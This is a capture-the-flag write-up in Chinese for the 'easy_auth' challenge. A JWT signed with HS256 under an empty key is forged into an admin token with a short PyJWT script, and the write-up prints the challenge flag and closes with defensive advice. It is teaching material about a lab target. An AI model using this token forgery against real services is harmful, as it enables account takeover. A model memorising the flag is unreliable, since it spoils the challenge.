# easy_auth

## 题目简述

站点注册、登录后会把 JWT 保存在浏览器的 `localStorage` 中，并依靠令牌里的用户身份访问待办事项接口。题目的签名算法是 `HS256`，但 HMAC 密钥为空，因此攻击者可以自行签发一个管理员令牌。

## 解题过程

先注册普通账号并登录，在开发者工具的 Application（或“应用”）面板中读取 `localStorage` 里的 JWT。令牌由三部分组成：

```text
base64url(header).base64url(payload).base64url(signature)
```

把令牌放入 JWT 调试器后，可以看到头部声明了 `HS256`，载荷中包含 `ID`、`UserName`、`Phone`、`Email`、`exp` 和 `iss` 等字段。尝试校验签名时发现密钥为空字符串；这意味着任何人都能使用同一算法为修改后的载荷生成合法签名。

将身份改成管理员，并设置一个尚未过期的 `exp`。用 PyJWT 可以生成令牌：

```python
import time

import jwt

payload = {
    "ID": 1,
    "UserName": "admin",
    "Phone": "",
    "Email": "",
    "exp": int(time.time()) + 3600,
    "iss": "MJclouds",
}

token = jwt.encode(payload, "", algorithm="HS256")
print(token)
```

如果原令牌中的 `iss` 或其他业务字段与上例不同，应保留实例里的原值，只修改确定用于鉴权的身份字段。将新令牌写回原来的 `localStorage` 键并刷新页面，再访问待办列表接口，即可读取管理员的待办内容。管理员记录中给出的 flag 为：

```text
hgame{S0_y0u_K1n0w_hOw_~JwT_Works~1l1lL}
```

## 方法总结

JWT 的载荷只是编码，不具备保密性；身份可信度完全取决于签名验证。`HS256` 使用共享密钥，空密钥或弱密钥等同于把签发能力交给客户端。服务端应使用足够随机的密钥、固定允许的算法，并在鉴权时校验过期时间、签发者和服务端保存的用户状态，而不能只相信载荷中的 `ID` 或用户名。
